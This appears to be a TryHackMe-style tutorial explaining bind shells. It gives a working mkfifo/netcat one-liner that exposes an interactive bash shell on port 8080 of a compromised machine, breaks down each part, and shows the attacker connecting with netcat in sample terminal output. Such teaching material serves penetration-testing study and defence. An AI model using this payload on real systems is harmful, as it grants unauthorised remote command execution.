# Bind Shell Overview

A bind shell binds a port on the compromised system, listening for incoming connections. When an attacker connects, it exposes a shell session for remote command execution. This method is useful when the target does not permit outgoing connections but is less popular due to its increased risk of detection.

## Setting Up the Bind Shell on the Target

To create a bind shell, the attacker can execute the following command on the target machine:

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

### Payload Explanation:

- `rm -f /tmp/f`: Removes any existing named pipe at /tmp/f to avoid conflicts.
- `mkfifo /tmp/f`: Creates a named pipe (FIFO) at /tmp/f for communication.
- `cat /tmp/f`: Reads data from the named pipe, waiting for input.
- `| bash -i 2>&1`: Pipes the input to an interactive bash shell, redirecting errors to standard output.
- `| nc -l 0.0.0.0 8080`: Listens for connections on all interfaces (0.0.0.0) at port 8080. This will expose the shell to the attacker once they connect.
- `> /tmp/f`: Sends command outputs back into the named pipe for bidirectional communication.

### Terminal on the Target Machine (Bind Shell Setup)

When the command is executed, the target machine will wait for an incoming connection.

```bash
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

## Attacker Connects to the Bind Shell

Once the target is listening, the attacker can connect using Netcat with the following command:

```bash
nc -nv TARGET_IP 8080
```

### Command Explanation:

- `nc`: Invokes Netcat to establish the connection.
- `-n`: Disables DNS resolution for faster operation.
- `-v`: Enables verbose mode for detailed connection output.
- `TARGET_IP`: The IP address of the target machine.
- `8080`: The port number on which the bind shell is listening.

### Attacker Terminal (After Connection)

After executing the connection command, the attacker receives a shell:

```bash
attacker@kali:~$ nc -nv 10.10.13.37 8080 
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$
```

This indicates that the attacker has successfully connected to the bind shell and can now execute commands on the target system.